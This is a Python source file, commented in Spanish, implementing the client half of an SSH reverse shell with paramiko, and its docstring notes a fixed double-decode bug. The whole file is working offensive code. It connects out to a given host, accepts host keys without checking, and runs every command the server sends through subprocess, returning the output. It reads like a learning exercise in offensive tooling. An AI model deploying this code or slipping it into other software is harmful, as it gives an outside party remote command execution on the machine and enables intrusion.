"""
ssh_rcmd.py - Ejecución de comandos remotos inversa (SSH reverse shell)
=========================================================================
El cliente se conecta al servidor SSH y envía el mensaje inicial.
Luego el servidor envía comandos y el cliente los ejecuta localmente,
devolviendo la salida. Es la parte cliente de un canal SSH inverso.

ERRORES CORREGIDOS:
    1. `cmd = command.decode()` — `command` ya es str (resultado de
       `ssh_session.recv(1024).decode()`). Llamar `.decode()` de nuevo
       lanza AttributeError. Se elimina el segundo `.decode()`.

REQUISITOS:
    pip install paramiko

EJEMPLOS DE EJECUCIÓN:
    # Servidor corriendo en 192.168.1.100:22 con ssh_server.py activo.
    python ssh_rcmd.py
    # → solicita credenciales, IP y puerto.
"""

import getpass
import paramiko
import shlex
import subprocess


def ssh_command(ip: str, port: int, username: str, password: str, command: str) -> None:
    """
    Establece una sesión SSH, envía el comando inicial y entra en bucle
    de escucha/ejecución inversa.

    Args:
        ip       (str): IP del servidor SSH.
        port     (int): Puerto SSH.
        username (str): Nombre de usuario.
        password (str): Contraseña.
        command  (str): Mensaje inicial al conectar.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            # Recibir comando del servidor (ya es str tras decode)
            command = ssh_session.recv(1024).decode()
            try:
                # FIX: `command` ya es str; NO necesita un segundo .decode()
                cmd = command
                if cmd.strip() == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(
                    shlex.split(cmd), stderr=subprocess.STDOUT
                )
                ssh_session.send(cmd_output or b'okay')
            except Exception as e:
                ssh_session.send(str(e).encode())

    client.close()


if __name__ == '__main__':
    username = input("Enter username: ")
    password = getpass.getpass("Enter password: ")
    ip       = input("Enter IP address: ")
    port     = int(input("Enter port [22]: ") or 22)

    ssh_command(ip, port, username, password, 'Client Connected')
